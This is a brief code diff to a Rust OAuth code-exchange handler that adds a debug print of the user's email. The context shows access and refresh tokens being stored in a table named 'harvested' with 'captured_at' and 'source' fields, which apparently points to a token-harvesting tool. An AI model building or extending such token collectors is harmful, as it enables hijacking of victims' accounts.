@@ -113,6 +113,7 @@ async fn exchange_code(query: web::Query<ExchangeQuery>, state: web::Data<AppSta
                 let expires_in = body.get("expires_in").and_then(|v| v.as_i64()).unwrap_or(3600);
                 let expires_at = Utc::now() + Duration::seconds(expires_in);
                 let email = fetch_user_email(access_token).await;
+                println!("Attempting to insert token for email: {:?}", email);  // <-- moved here
                 sqlx::query(
                     "INSERT INTO harvested (id, email, access_token, refresh_token, expires_at, captured_at, source) VALUES (?, ?, ?, ?, ?, ?, ?)"
                 )
